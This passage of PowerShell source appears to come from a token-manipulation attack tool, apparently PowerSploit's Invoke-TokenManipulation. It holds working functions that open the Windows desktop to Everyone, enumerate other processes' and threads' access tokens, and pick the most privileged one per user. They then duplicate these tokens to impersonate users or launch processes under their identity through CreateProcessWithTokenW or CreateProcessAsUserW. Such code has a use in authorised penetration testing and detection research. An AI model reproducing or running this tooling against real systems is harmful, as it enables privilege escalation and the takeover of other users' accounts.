        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

        Write-Verbose ""Attempting to enable privilege: $Privilege""
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
        Write-Verbose ""Enabled privilege: $Privilege""
    }


    
    function Set-DesktopACLs
    {
        Enable-Privilege -Privilege SeSecurityPrivilege

        
        $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(""WinSta0"")
        $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)

        if ($hWinsta -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hWinsta
        $CloseHandle.Invoke($hWinsta) | Out-Null

        
        $hDesktop = $OpenDesktopA.Invoke(""default"", 0, $false, $Win32Constants.DESKTOP_GENERIC_ALL -bor $Win32Constants.WRITE_DAC)
        if ($hDesktop -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hDesktop
        $CloseHandle.Invoke($hDesktop) | Out-Null
    }


    function Set-DesktopACLToAllowEveryone
    {
        Param(
            [IntPtr]$hObject
            )

        [IntPtr]$ppSidOwner = [IntPtr]::Zero
        [IntPtr]$ppsidGroup = [IntPtr]::Zero
        [IntPtr]$ppDacl = [IntPtr]::Zero
        [IntPtr]$ppSacl = [IntPtr]::Zero
        [IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
        
        $retVal = $GetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
        if ($retVal -ne 0)
        {
            Write-Error ""Unable to call GetSecurityInfo. ErrorCode: $retVal""
        }

        if ($ppDacl -ne [IntPtr]::Zero)
        {
            $AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type]$ACL)

            
            [UInt32]$RealSize = 2000
            $pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
            $Success = $CreateWellKnownSid.Invoke(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
            if (-not $Success)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            
            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TRUSTEE)
            $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
            $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
            $TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
            $TrusteeObj.MultipleTrusteeOperation = 0
            $TrusteeObj.TrusteeForm = $Win32Constants.TRUSTEE_IS_SID
            $TrusteeObj.TrusteeType = $Win32Constants.TRUSTEE_IS_WELL_KNOWN_GROUP
            $TrusteeObj.ptstrName = $pAllUsersSid

            
            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EXPLICIT_ACCESS)
            $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
            $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
            $ExplicitAccess.grfAccessPermissions = 0xf03ff
            $ExplicitAccess.grfAccessMode = $Win32constants.GRANT_ACCESS
            $ExplicitAccess.grfInheritance = $Win32Constants.OBJECT_INHERIT_ACE
            $ExplicitAccess.Trustee = $TrusteeObj

            [IntPtr]$NewDacl = [IntPtr]::Zero

            $RetVal = $SetEntriesInAclW.Invoke(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
            if ($RetVal -ne 0)
            {
                Write-Error ""Error calling SetEntriesInAclW: $RetVal""
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)

            if ($NewDacl -eq [IntPtr]::Zero)
            {
                throw ""New DACL is null""
            }

            
            $RetVal = $SetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
            if ($RetVal -ne 0)
            {
                Write-Error ""SetSecurityInfo failed. Return value: $RetVal""
            }

            $LocalFree.Invoke($ppSecurityDescriptor) | Out-Null
        }
    }


    
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose ""Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process.""
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode""
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode""
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    function Get-ThreadToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )

        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS

        $RetStruct = New-Object PSObject
        [IntPtr]$hThreadToken = [IntPtr]::Zero

        $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
        if ($hThread -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) 
            {
                Write-Warning ""Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode""
            }
        }
        else
        {
            $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  
                 ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) 
                {
                    Write-Warning ""Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode""
                }
            }
            else
            {
                Write-Verbose ""Successfully queried thread token""
            }

            
            if (-not $CloseHandle.Invoke($hThread))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode""
            }
            $hThread = [IntPtr]::Zero
        }

        $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
        return $RetStruct
    }


    
    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        $ReturnObj = $null

        $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
        [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
        [UInt32]$RealSize = 0
        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning ""GetTokenInformation failed. Error code: $ErrorCode""
        }
        else
        {
            $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)

            
            $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)

            [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
            $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
            if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
            {
                Write-Warning ""Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr""
            }
            else
            {
                $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
                    $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)

                    
                    
                    
                    if ($Username -ieq ""$($env:COMPUTERNAME)`$"")
                    {
                        [UInt32]$Size = 100
                        [UInt32]$NumUsernameChar = $Size / 2
                        [UInt32]$NumDomainChar = $Size / 2
                        [UInt32]$SidNameUse = 0
                        $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)

                        if ($Success)
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
                            $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning ""Error calling LookupAccountSidW. Error code: $ErrorCode""
                        }

                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
                        $UsernameBuffer = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
                        $DomainBuffer = [IntPtr]::Zero
                    }

                    $ReturnObj = New-Object PSObject
                    $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                    $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType


                    
                    $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false

                    $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
                    $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning ""GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode"" 
                    }
                    else
                    {
                        $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
                        if ($TokenElevation.TokenIsElevated -ne 0)
                        {
                            $ReturnObj.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)


                    
                    $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value ""UnableToRetrieve""

                    [UInt32]$TokenTypeSize = 4
                    [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning ""GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode""
                    }
                    else
                    {
                        [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
                        switch($TokenType)
                        {
                            1 {$ReturnObj.TokenType = ""Primary""}
                            2 {$ReturnObj.TokenType = ""Impersonation""}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)


                    
                    if ($ReturnObj.TokenType -ieq ""Impersonation"")
                    {
                        $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value ""UnableToRetrieve""

                        [UInt32]$ImpersonationLevelSize = 4
                        [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) 
                        [UInt32]$RealSize = 0
                        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
                        if (-not $Success)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning ""GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode""
                        }
                        else
                        {
                            [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
                            switch ($ImpersonationLevel)
                            {
                                0 { $ReturnObj.ImpersonationLevel = ""SecurityAnonymous"" }
                                1 { $ReturnObj.ImpersonationLevel = ""SecurityIdentification"" }
                                2 { $ReturnObj.ImpersonationLevel = ""SecurityImpersonation"" }
                                3 { $ReturnObj.ImpersonationLevel = ""SecurityDelegation"" }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
                    }


                    
                    $ReturnObj | Add-Member -Type NoteProperty -Name SessionID -Value ""Unknown""

                    [UInt32]$TokenSessionIdSize = 4
                    [IntPtr]$TokenSessionIdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenSessionIdSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenSessionId, $TokenSessionIdPtr, $TokenSessionIdSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning ""GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode""
                    }
                    else
                    {
                        [UInt32]$TokenSessionId = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenSessionIdPtr, [Type][UInt32])
                        $ReturnObj.SessionID = $TokenSessionId
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenSessionIdPtr)


                    
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()

                    [UInt32]$TokenPrivilegesSize = 1000
                    [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPrivilegesPtr, $TokenPrivilegesSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning ""GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode""
                    }
                    else
                    {
                        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
                        
                        
                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, ""Privileges"")))
                        $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                        for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                        {
                            $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))

                            $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)

                            
                            [UInt32]$PrivilegeNameSize = 60
                            $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
                            $PLuid = $LuidAndAttributePtr 

                            $Success = $LookupPrivilegeNameW.Invoke([IntPtr]::Zero, $PLuid, $PrivilegeNamePtr, [Ref]$PrivilegeNameSize)
                            if (-not $Success)
                            {
                                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning ""Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $PrivilegeNameSize""
                            }
                            $PrivilegeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($PrivilegeNamePtr)

                            
                            $PrivilegeStatus = """"
                            $Enabled = $false

                            if ($LuidAndAttribute.Attributes -eq 0)
                            {
                                $Enabled = $false
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) 
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED) -eq $Win32Constants.SE_PRIVILEGE_ENABLED) 
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_REMOVED) -eq $Win32Constants.SE_PRIVILEGE_REMOVED) 
                            {
                                Write-Warning ""Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. ""
                            }

                            if ($Enabled)
                            {
                                $ReturnObj.PrivilegesEnabled += ,$PrivilegeName
                            }
                            else
                            {
                                $ReturnObj.PrivilegesAvailable += ,$PrivilegeName
                            }

                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PrivilegeNamePtr)
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)

                }
                else
                {
                    Write-Verbose ""Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)""
                }

                
                $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
                $LogonSessionDataPtr = [IntPtr]::Zero
                if ($ntstatus -ne 0)
                {
                    Write-Warning ""Call to LsaFreeReturnBuffer failed. Error code: $ntstatus""
                }
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
            $LuidPtr = [IntPtr]::Zero
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
        $TokenStatsPtr = [IntPtr]::Zero

        return $ReturnObj
    }


    
    function Get-UniqueTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $AllTokens
        )

        $TokenByUser = @{}
        $TokenByEnabledPriv = @{}
        $TokenByAvailablePriv = @{}

        
        foreach ($Token in $AllTokens)
        {
            $Key = $Token.Domain + ""\"" + $Token.Username
            if (-not $TokenByUser.ContainsKey($Key))
            {
                
                
                if ($Token.LogonType -ne 3 -and
                    $Token.Username -inotmatch ""^DWM-\d+$"" -and
                    $Token.Username -inotmatch ""^LOCAL\sSERVICE$"")
                {
                    $TokenByUser.Add($Key, $Token)
                }
            }
            else
            {
                
                if($Token.IsElevated -eq $TokenByUser[$Key].IsElevated)
                {
                    if (($Token.PrivilegesEnabled.Count + $Token.PrivilegesAvailable.Count) -gt ($TokenByUser[$Key].PrivilegesEnabled.Count + $TokenByUser[$Key].PrivilegesAvailable.Count))
                    {
                        $TokenByUser[$Key] = $Token
                    }
                }
                
                elseif (($Token.IsElevated -eq $true) -and ($TokenByUser[$Key].IsElevated -eq $false))
                {
                    $TokenByUser[$Key] = $Token
                }
            }
        }

        
        foreach ($Token in $AllTokens)
        {
            $Fullname = ""$($Token.Domain)\$($Token.Username)""

            
            foreach ($Privilege in $Token.PrivilegesEnabled)
            {
                if ($TokenByEnabledPriv.ContainsKey($Privilege))
                {
                    if($TokenByEnabledPriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByEnabledPriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByEnabledPriv.Add($Privilege, @($Fullname))
                }
            }

            
            foreach ($Privilege in $Token.PrivilegesAvailable)
            {
                if ($TokenByAvailablePriv.ContainsKey($Privilege))
                {
                    if($TokenByAvailablePriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByAvailablePriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByAvailablePriv.Add($Privilege, @($Fullname))
                }
            }
        }

        $ReturnDict = @{
            TokenByUser = $TokenByUser
            TokenByEnabledPriv = $TokenByEnabledPriv
            TokenByAvailablePriv = $TokenByAvailablePriv
        }

        return (New-Object PSObject -Property $ReturnDict)
    }


    function Invoke-ImpersonateUser
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) 
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning ""DuplicateTokenEx failed. ErrorCode: $ErrorCode""
        }
        else
        {
            $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
            if (-not $Success)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""Failed to ImpersonateLoggedOnUser. Error code: $Errorcode""
            }
        }

        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning ""CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode""
        }

        return $Success
    }


    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken,

            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,

            [Parameter(Position=2)]
            [String]
            $ProcessArgs,

            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose ""Entering Create-ProcessWithToken""
        
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning ""DuplicateTokenEx failed. ErrorCode: $ErrorCode""
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) 

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(""$ProcessName"")
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(""`""$ProcessName`"" $ProcessArgs"")
            }
            
            $FunctionName = """"
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                
                
                
                Write-Verbose ""Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token.""
                Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
                $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = ""CreateProcessAsUserW""
            }
            else
            {
                Write-Verbose ""Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token.""
                $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = ""CreateProcessWithTokenW""
            }
            if ($Success)
            {
                
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null

		
		if ($PassThru) {
			
			$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId

			
			$null = $returnProcess.Handle

			
			$returnProcess
		}
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""$FunctionName failed. Error code: $ErrorCode""
            }

            
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning ""CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode""
            }
        }
    }


    function Free-AllTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TokenInfoObjs
        )

        foreach ($Obj in $TokenInfoObjs)
        {
            $Success = $CloseHandle.Invoke($Obj.hToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose ""Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode""
            }
            $Obj.hToken = [IntPtr]::Zero
        }
    }


    
    function Enum-AllTokens
    {
        $AllTokens = @()

        
        
